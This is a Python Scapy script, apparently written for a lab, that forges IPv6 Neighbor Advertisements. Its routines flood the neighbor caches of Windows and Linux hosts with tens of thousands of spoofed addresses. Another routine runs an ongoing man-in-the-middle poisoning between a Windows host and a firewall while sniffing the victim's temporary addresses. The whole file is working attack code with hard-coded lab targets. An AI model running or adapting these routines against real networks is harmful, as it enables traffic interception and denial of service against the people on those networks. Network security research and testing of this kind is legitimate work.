#!/usr/bin/python

from scapy.all import *
from sets import Set


"""
the class build NA messages
"""
class NA:
    
    def __init__(self):
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.linuxMac = "08:00:27:84:bb:37"
        self.linuxSolicitedMulti = "ff02::1:ff84:bb37"
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.winMac = "08:00:27:82:a6:ec"
        self.winSolicitedMulti = "ff02::1:ff47:fd83"
        self.linkWin = "fe80::b485:2aec:9447:fd83"
        self.firewall = "2001:abcd:acad:2::1"
        self.firewallMac = "08:00:27:b1:da:41"
        self.linkFirewall = "fe80::1"
        self.prefix = "2001:abcd:acad:2:"
        self.adrList = Set()
        print 'Neighbor Advertisement'

    
    def buildPacketInternalCacheFlooding(self, mac, srcGlobalUni, ipAdr):
        targetLinkLayer = ICMPv6NDOptDstLLAddr(lladdr=mac)
        return Ether(src=mac)/IPv6(dst=ipAdr,src=srcGlobalUni)/ICMPv6ND_NA(R=0,S=1,O=1,tgt=srcGlobalUni)/targetLinkLayer

    def buildPacketInternalMitm(self, mac, src, dst, isRouter, solicited):
        targetLinkLayer = ICMPv6NDOptDstLLAddr(lladdr=mac)
        return Ether(src=mac)/IPv6(dst=dst,src=src)/ICMPv6ND_NA(R=isRouter,S=solicited,O=1,tgt=src)/targetLinkLayer

    def buildPacketRemoteCacheFlooding(self, mac, dst, tgtGlobalUni):
        targetLinkLayer = ICMPv6NDOptDstLLAddr(lladdr=mac)
        return Ether(src=mac)/IPv6(dst=dst,src=tgtGlobalUni)/ICMPv6ND_NA(R=0,S=1,O=1,tgt=tgtGlobalUni)/targetLinkLayer


    #interfaces for internal testing
    def execModuleInternalCacheFloodingWin(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex24 = '{:04x}'.format(t)
            mac = "08:00:27:" + "00" + ":" + hex24[:2] + ":" + hex24[2:4]
            globalUni = self.prefix + ":" + hex24[:2] + ":" + hex24[2:4]
            #the ping activates the process to be poisoned
            data = "abcdefghijklmnopqrstabcd"
            ping = IPv6(dst=self.win,src=globalUni)/ICMPv6EchoRequest()/data
            send(ping, iface=exitIface, verbose=False)
            #send NA after victim sent NS to verify reachability and insert in neighbors cache and then respond with Echo reply
            packetContainer = self.buildPacketInternalCacheFlooding(mac, globalUni, self.win)
            sendp(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalCacheFloodingLinux(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex24 = '{:04x}'.format(t)
            mac = "08:00:27:" + "00" + ":" + hex24[:2] + ":" + hex24[2:4]
            globalUni = self.prefix + ":" + hex24[:2] + ":" + hex24[2:4]
            #the ping activates the process to be poisoned
            data = "abcdefghijklmnopqrstabcd"
            ping = IPv6(dst=self.linux,src=globalUni)/ICMPv6EchoRequest()/data
            send(ping, iface=exitIface, verbose=False)
            #send NA after victim sent NS to verify reachability and insert in neighbors cache and then respond with Echo reply
            packetContainer = self.buildPacketInternalCacheFlooding(mac, globalUni, self.linux)
            sendp(packetContainer, iface=exitIface, verbose=False)

    #internally only against Windows
    def execModuleInternalWinMitm(self, exitIface):
        data = "abcdefghijklmnopqrstabcd"
        #this is to induce windows to disclose its temp adr
        pingWindows = IPv6(dst=self.win)/ICMPv6EchoReply()
        send(pingWindows, iface=exitIface, verbose=False)
        #ping windows device
        pingWindows = IPv6(dst=self.linkWin,src=self.linkFirewall)/ICMPv6EchoRequest()/data
        send(pingWindows, iface=exitIface, verbose=False)
        #send NA using link local after windows start reachability process
        packetContainerWin = self.buildPacketInternalMitm(self.linuxMac, self.linkFirewall, self.linkWin, True, 1)
        sendp(packetContainerWin, iface=exitIface, verbose=False)
        #send NA using Firewall src global after windows start reachability process
        packetContainerWinFGlobal = self.buildPacketInternalMitm(self.linuxMac, self.firewall, self.linkWin, True, 1)
        sendp(packetContainerWinFGlobal, iface=exitIface, verbose=False)
        #send NA to Firewall using link local
        packetContainerFirewall = self.buildPacketInternalMitm(self.linuxMac, self.linkWin, self.linkFirewall, False, 0)
        sendp(packetContainerFirewall, iface=exitIface, verbose=False)
        #the sniffer eventually grabs the win tmp adr
        self.receiver(exitIface)
        print self.adrList
        #continue to send NA to both firewall and win to maintain Mitm
        for p in range(1,500):
            for adr in self.adrList:
                packet = self.buildPacketInternalMitm(self.linuxMac, adr, self.linkFirewall, False, 0)
                sendp(packet, iface=exitIface, verbose=False)
            sendp(packetContainerFirewall, iface=exitIface, verbose=False)
            sendp(packetContainerWin, iface=exitIface, verbose=False)
            sendp(packetContainerWinFGlobal, iface=exitIface, verbose=False)

    def execModuleRemoteLinuxCacheFlooding(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex24 = '{:04x}'.format(t)
            mac = "08:00:27:" + "00" + ":" + hex24[:2] + ":" + hex24[2:4]
            globalUni = self.prefix + ":" + hex24[:2] + ":" + hex24[2:4]
            #the ping activates the poisoning
            data = "abcdefghijklmnopqrstabcd"
            ping = IPv6(dst=self.linux,src=globalUni)/ICMPv6EchoRequest()/data
            send(ping, iface=exitIface, verbose=False)
            packetContainer = self.buildPacketRemoteCacheFlooding(mac, self.linux, globalUni)
            sendp(packetContainer, iface=exitIface, verbose=False)
            

    #the callback adds IPv6 adr with the prefix and which are not internal Linux Debian
    def packet_callback(self, packet):
        if IPv6 in packet[0]:
            adr = packet[IPv6].dst
            print adr
            if self.prefix in adr and not adr == self.linux:
                self.adrList.add(adr)        

    #the sniffer for the internal Mitm NA attack
    def receiver(self, iFace):
        sniff(iface=iFace, filter='ip6', prn=self.packet_callback, store=0, timeout=10)

